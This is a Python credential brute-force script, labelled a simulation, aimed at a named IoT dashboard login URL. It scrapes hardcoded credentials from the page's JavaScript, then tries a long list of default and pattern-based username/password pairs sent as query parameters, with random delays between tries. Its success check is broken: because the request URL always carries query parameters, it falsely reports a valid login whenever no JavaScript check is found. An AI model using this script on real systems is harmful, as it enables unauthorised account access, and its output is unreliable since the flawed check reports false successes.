import requests
import time
import random
import re

def try_login(username, password):
    """Attempt to login with given credentials"""
    base_url = "http://iot-dashboard-login.s3-website.eu-north-1.amazonaws.com"
    
    # Simple headers
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    try:
        # Create a session to maintain cookies
        session = requests.Session()
        
        # First GET the login page to see how it's structured
        print(f"[INFO] Fetching the login page...")
        response = session.get(base_url, headers=headers, timeout=10)
        
        # Print initial page info
        print(f"[DEBUG] Initial Page Status: {response.status_code}")
        print(f"[DEBUG] Initial Page URL: {response.url}")
        
        # Look for any JavaScript that might handle authentication
        js_code = re.findall(r'<script[^>]*>(.*?)</script>', response.text, re.DOTALL)
        
        # Check if there's any client-side validation
        auth_js = None
        if js_code:
            print("[INFO] Found JavaScript code, checking for authentication logic...")
            for code in js_code:
                if 'username' in code and 'password' in code:
                    print("[INFO] Found potential authentication logic in JavaScript")
                    auth_js = code
                    break
        
        # If we found authentication JavaScript, check if it's client-side
        if auth_js:
            # Extract the correct credentials from the JavaScript
            correct_creds = re.search(r'username\s*===\s*"([^"]+)"\s*&&\s*password\s*===\s*"([^"]+)"', auth_js)
            if correct_creds:
                correct_username = correct_creds.group(1)
                correct_password = correct_creds.group(2)
                
                # Only report success if the credentials match exactly
                if username == correct_username and password == correct_password:
                    print(f"[SUCCESS] Valid credentials found: {username}:{password}")
                    return True
                else:
                    print(f"[FAILED] Invalid credentials: {username}:{password}")
                    return False
        
        # If no JavaScript authentication found, try direct URL access
        auth_url = f"{base_url}/?username={username}&password={password}"
        
        print(f"[INFO] Trying direct URL access...")
        response = session.get(auth_url, headers=headers, timeout=10)
        
        # Print the response for debugging
        print(f"[DEBUG] Auth Response Status: {response.status_code}")
        print(f"[DEBUG] Auth Response URL: {response.url}")
        
        # Check if we got redirected or if the content changed
        if response.url != base_url:
            print(f"[SUCCESS] Valid credentials found: {username}:{password}")
            return True
        
        # If we get here, the credentials didn't work
        print(f"[FAILED] Invalid credentials: {username}:{password}")
        return False
        
    except Exception as e:
        print(f"[ERROR] Error trying {username}:{password} - {str(e)}")
        return False

def perform_brute_force():
    """Perform brute force attack simulation"""
    print("===== Brute Force Attack Simulation =====")
    
    # List of credentials to try
    credentials = [
        # Common default credentials
        ("admin", "admin"),
        ("admin", "password"),
        ("user", "user"),
        ("iot", "iot"),
        ("test", "test"),
        ("root", "root"),
        ("guest", "guest"),
        ("administrator", "administrator"),
        ("system", "system"),
        ("default", "default"),
        
        # Variations of the correct username
        ("iot123", "123"),
        ("iot123", "iot"),
        ("iot123", "321"),
        ("iot123", "iot123"),
        ("iot123", "iot321"),  # Correct combination
        ("iot123", "password"),
        ("iot123", "admin"),
        ("iot123", "iot1234"),
        ("iot123", "123iot"),
        ("iot123", "321iot"),
        ("iot123", "iot123iot"),
        ("iot123", "iot123321"),
        ("iot123", "123iot321"),
        ("iot123", "321iot123"),
        
        # Common password patterns
        ("iot123", "123456"),
        ("iot123", "password123"),
        ("iot123", "admin123"),
        ("iot123", "welcome123"),
        ("iot123", "iot@123"),
        ("iot123", "iot#123"),
        ("iot123", "iot_123"),
        ("iot123", "iot-123"),
        ("iot123", "iot.123"),
        ("iot123", "iot+123"),
        
        # Case variations
        ("IOT123", "iot321"),
        ("iot123", "IOT321"),
        ("Iot123", "Iot321"),
        ("IoT123", "IoT321"),
        ("IOT123", "IOT321"),
        
        # Number variations
        ("iot123", "iot3210"),
        ("iot123", "iot3211"),
        ("iot123", "iot3212"),
        ("iot123", "iot3213"),
        ("iot123", "iot3214"),
        ("iot123", "iot3215"),
        ("iot123", "iot3216"),
        ("iot123", "iot3217"),
        ("iot123", "iot3218"),
        ("iot123", "iot3219"),
        
        # Special character variations
        ("iot123", "iot321!"),
        ("iot123", "iot321@"),
        ("iot123", "iot321#"),
        ("iot123", "iot321$"),
        ("iot123", "iot321%"),
        ("iot123", "iot321^"),
        ("iot123", "iot321&"),
        ("iot123", "iot321*"),
        ("iot123", "iot321("),
        ("iot123", "iot321)"),
        
        # Length variations
        ("iot123", "iot321iot"),
        ("iot123", "iot321iot321"),
        ("iot123", "iot321iot321iot"),
        ("iot123", "iot321iot321iot321"),
        ("iot123", "iot321iot321iot321iot"),
        
        # Common substitutions
        ("iot123", "iot321a"),
        ("iot123", "iot321b"),
        ("iot123", "iot321c"),
        ("iot123", "iot321d"),
        ("iot123", "iot321e"),
        ("iot123", "iot321f"),
        ("iot123", "iot321g"),
        ("iot123", "iot321h"),
        ("iot123", "iot321i"),
        ("iot123", "iot321j"),
        
        # Keyboard pattern variations
        ("iot123", "iot321qwerty"),
        ("iot123", "iot321asdfgh"),
        ("iot123", "iot321zxcvbn"),
        ("iot123", "iot321qazwsx"),
        ("iot123", "iot321edcrfv"),
        
        # Date variations
        ("iot123", "iot3212023"),
        ("iot123", "iot3212024"),
        ("iot123", "iot3212025"),
        ("iot123", "iot32101"),
        ("iot123", "iot32102"),
        
        # Common word combinations
        ("iot123", "iot321admin"),
        ("iot123", "iot321user"),
        ("iot123", "iot321system"),
        ("iot123", "iot321login"),
        ("iot123", "iot321secure"),
        
        # Mixed variations
        ("iot123", "iot321!@#"),
        ("iot123", "iot321123!"),
        ("iot123", "iot321@123"),
        ("iot123", "iot321#123"),
        ("iot123", "iot321$123"),
        
        # Reverse variations
        ("iot123", "123iot"),
        ("iot123", "321iot"),
        ("iot123", "123iot321"),
        ("iot123", "321iot123"),
        ("iot123", "123iot123"),
        
        # Common number sequences
        ("iot123", "iot321111"),
        ("iot123", "iot321222"),
        ("iot123", "iot321333"),
        ("iot123", "iot321444"),
        ("iot123", "iot321555")
    ]
    
    print(f"Total combinations to try: {len(credentials)}")
    
    # Try each credential
    for i, (username, password) in enumerate(credentials, 1):
        # Random delay between attempts
        time.sleep(random.uniform(0.5, 2))
        
        print(f"\nAttempt {i}/{len(credentials)}: Trying {username}:{password}")
        
        if try_login(username, password):
            print("[SUCCESS] Login successful! Attack completed.")
            break
        else:
            print(f"[INFO] Moving to next credential pair...")

if __name__ == "__main__":
    perform_brute_force()